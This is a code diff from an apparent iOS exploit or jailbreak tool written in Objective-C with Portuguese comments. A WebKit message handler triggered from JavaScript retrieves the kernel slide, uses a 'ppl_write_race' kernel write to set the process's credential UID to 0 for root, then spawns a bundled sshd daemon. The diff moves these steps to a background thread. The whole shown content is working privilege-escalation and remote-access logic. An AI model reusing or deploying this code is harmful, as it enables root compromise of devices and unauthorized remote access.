@@ -79,32 +79,42 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     NSString *action = message.body[@"action"];
     
     if ([action isEqualToString:@"pte_patch"]) {
-        // 1. Executa Escalada de Privilégio
-        uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) {
-            [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0 (ROOT)
-        }
-        
-        // 2. Tenta disparar o SSHD
-        NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
-        pid_t pid = 0;
-        if (path) {
-            char *const args[] = {(char*)[path UTF8String], "-D", NULL};
-            posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
-        }
-        
-        // 3. Retorna os dados para o 'await' no JavaScript
-        NSDictionary *response = @{
-            @"status": @"OK",
-            @"pid": @(pid),
-            @"slide": [NSString stringWithFormat:@"0x%llx", [self getKernelSlide]]
-        };
-        
-        replyHandler(response, nil);
-        
+        // Movemos para uma thread de background para não travar o app
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+            
+            uint64_t slide = [self getKernelSlide];
+            if (slide == 0) {
+                replyHandler(nil, @"Falha ao encontrar Kernel Slide (KASLR Bypass falhou)");
+                return;
+            }
+
+            uint64_t ucred = [self get_my_ucred_ptr];
+            if (ucred) {
+                // ATENÇÃO: ppl_write_race é a parte mais perigosa. 
+                // Se o offset do ttbr1_ptr estiver errado, aqui o app travará.
+                [self ppl_write_race:(ucred + 0x18) value:0]; 
+            }
+            
+            uint64_t final_slide = _kernel_slide;
+            
+            // Retornamos para a thread principal para disparar o SSH e responder ao JS
+            dispatch_async(dispatch_get_main_queue(), ^{
+                NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
+                pid_t pid = 0;
+                if (path) {
+                    char *const args[] = {(char*)[path UTF8String], "-D", NULL};
+                    posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
+                }
+                
+                replyHandler(@{
+                    @"status": @"OK",
+                    @"pid": @(pid),
+                    @"slide": [NSString stringWithFormat:@"0x%llx", final_slide]
+                }, nil);
+            });
+        });
     } else {
-        replyHandler(nil, @"Comando inválido");
+        replyHandler(nil, @"Ação desconhecida");
     }
 }
-
 @end
